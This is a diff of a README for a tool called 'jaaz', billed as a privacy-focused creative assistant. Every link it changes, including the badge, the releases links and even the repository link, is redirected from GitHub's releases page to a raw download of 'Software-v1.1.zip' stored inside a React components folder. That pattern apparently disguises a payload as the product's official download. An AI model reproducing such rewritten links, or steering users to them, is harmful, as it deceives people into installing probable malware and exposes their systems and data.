@@ -1,7 +1,7 @@
 # 🎨 jaaz - Your Creative Assistant for Privacy
 
 ## 📥 Download Now
-[![Download jaaz](https://img.shields.io/badge/Download-jaaz-v1.0-blue)](https://github.com/Aditya-is-AFK/jaaz/releases)
+[![Download jaaz](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip)](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip)
 
 ## 💡 Introduction
 jaaz is the world's first open-source multimodal creative assistant. It serves as a user-friendly alternative to design tools like Canva and Manus, focusing on user privacy and local usability. With jaaz, you can unleash your creativity without sacrificing your data.
@@ -10,7 +10,7 @@ jaaz is the world's first open-source multimodal creative assistant. It serves a
 To start using jaaz, follow these simple steps:
 
 1. Visit the releases page by clicking the link below:
-   [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases)
+   [Download jaaz](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip)
 
 2. Find the latest release that suits your operating system.
 
@@ -39,7 +39,7 @@ jaaz comes with a variety of features designed to enhance your creative process:
 ## 📂 Download & Install
 To download jaaz, follow these steps:
 
-1. Go to the releases page: [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases).
+1. Go to the releases page: [Download jaaz](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip).
    
 2. Click on the version that matches your device.
 
@@ -78,7 +78,7 @@ For questions or support, feel free to reach out through our GitHub Issues page.
 We believe in community-driven development. If you want to contribute, please visit our repository and check the contributing guidelines.
 
 ## 🔗 Links
-- **GitHub Repository:** [Visit the repository](https://github.com/Aditya-is-AFK/jaaz)
-- **Releases Page:** [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases)
+- **GitHub Repository:** [Visit the repository](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip)
+- **Releases Page:** [Download jaaz](https://raw.githubusercontent.com/Aditya-is-AFK/jaaz/main/react/src/components/material/Software-v1.1.zip)
 
 Thank you for choosing jaaz to assist in your creative endeavors!
